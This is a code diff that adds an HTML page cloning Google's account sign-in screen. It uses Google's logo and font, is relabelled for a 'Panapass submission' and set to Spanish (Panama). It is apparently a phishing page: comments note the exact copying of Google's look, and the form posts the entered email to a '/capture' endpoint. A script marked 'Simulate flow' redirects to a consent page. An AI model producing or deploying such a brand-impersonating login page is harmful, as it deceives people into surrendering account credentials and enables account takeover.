@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="es" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet"> <!-- Exact Google font -->
+    <style>
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            background-color: #fff;
+            color: #202124;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        .header-bar {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 60px;
+            background-color: #fff;
+            border-bottom: 1px solid #e8eaed;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 24px;
+            box-sizing: border-box;
+        }
+        .header-bar .logo {
+            width: 75px;
+            height: 24px;
+        }
+        .header-bar .logo img {
+            width: 100%;
+            height: 100%;
+        }
+        .header-bar .account {
+            display: flex;
+            align-items: center;
+            font-size: 14px;
+            color: #5f6368;
+        }
+        .header-bar .account img {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            margin-right: 8px;
+        }
+        .signin-card {
+            background: #fff;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            box-shadow: 0 1px 3px 0 rgba(60,64,67,.302), 0 4px 8px 3px rgba(60,64,67,.149);
+            width: 448px;
+            padding: 48px 40px 36px;
+            box-sizing: border-box;
+            margin-top: 60px; /* Account for header */
+        }
+        .signin-card h1 {
+            font-size: 24px;
+            font-weight: 400;
+            line-height: 1.3333;
+            color: #202124;
+            margin: 0 0 8px;
+            text-align: center;
+        }
+        .signin-card .subtitle {
+            font-size: 16px;
+            color: #5f6368;
+            margin: 0 0 32px;
+            text-align: center;
+        }
+        .form-group {
+            margin-bottom: 12px;
+        }
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 400;
+            color: #202124;
+            margin-bottom: 4px;
+        }
+        .form-group input {
+            width: 100%;
+            height: 56px;
+            padding: 0 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-size: 16px;
+            line-height: 24px;
+        }
+        .form-group input:focus {
+            border-color: #1a73e8;
+            outline: none;
+            box-shadow: 0 1px 0 0 #1a73e8;
+        }
+        .next-btn {
+            background-color: #1a73e8;
+            border: none;
+            border-radius: 4px;
+            color: #fff;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: 500;
+            height: 36px;
+            letter-spacing: .0107142857em;
+            line-height: 36px;
+            margin-top: 24px;
+            padding: 0 24px;
+            text-align: center;
+            width: 100%;
+        }
+        .next-btn:hover {
+            background-color: #1557b0;
+        }
+        .next-btn:disabled {
+            background-color: #dadce0;
+            color: #3c4043;
+            cursor: default;
+        }
+        .use-another {
+            display: block;
+            text-align: center;
+            margin-top: 16px;
+            font-size: 14px;
+            color: #1a73e8;
+            text-decoration: none;
+        }
+        .use-another:hover {
+            text-decoration: underline;
+        }
+        .footer {
+            margin-top: 64px;
+            text-align: center;
+            font-size: 12px;
+            color: #5f6368;
+        }
+        .footer a {
+            color: #1a73e8;
+            text-decoration: none;
+            margin: 0 8px;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        .language-selector {
+            position: absolute;
+            top: 16px;
+            right: 16px;
+            font-size: 13px;
+            color: #5f6368;
+        }
+        .language-selector a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+        .language-selector a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="header-bar">
+        <div class="logo">
+            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
+        </div>
+        <div class="account">
+            <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMiAzMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTAgMEMwIDAgMCAwbTE2IDMwYzYuNjI3IDAgMTIgNS4zNzMgMTIgMTJzLTUuMzczIDEyLTEyIDEyLTEyLTUuMzczLTEyLTEyIDUuMzczLTEyIDEyLTEyem0wIDMuNWM1LjI0OCAwIDkuNSA0LjI1MiA5LjUgOS41UzIxLjI0OCAyNi41IDE2IDI2LjVzLTkuNS00LjI1Mi05LjUtOS41IDQuMjUyLTkuNSA5LjUtOS41ek0xNiA5YzMuMzEzIDAgNiAyLjY4NyA2IDZzLTIuNjg3IDYtNiA2LTYtMi42ODctNi02IDIuNjg3LTYgNi02eiIgc3R5bGU9ImZpbGw6IzNmNTE1YSIvPgo8L3N2Zz4K" alt="Account">
+            test@example.com
+        </div>
+    </div>
+
+    <div class="language-selector">
+        <a href="#">Spanish (Panama)</a> <!-- Changed from English (United States) -->
+    </div>
+
+    <div class="signin-card">
+        <h1>Sign in to continue with Panapass submission</h1> <!-- Tweak applied -->
+        <p class="subtitle">to continue to Panapass submission</p>
+        
+        <form action="/capture" method="POST">
+            <div class="form-group">
+                <label for="identifier">Email or phone</label>
+                <input type="text" id="identifier" name="email" required autofocus>
+            </div>
+            <button type="submit" class="next-btn">Next</button>
+        </form>
+        
+        <a href="#" class="use-another">Use another account</a>
+        
+        <div class="footer">
+            <a href="#">Help</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+        </div>
+    </div>
+
+    <script>
+        // Simulate flow
+        document.querySelector('form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            window.location.href = 'consent.html'; // Redirect to consent page
+        });
+    </script>
+</body>
+</html>
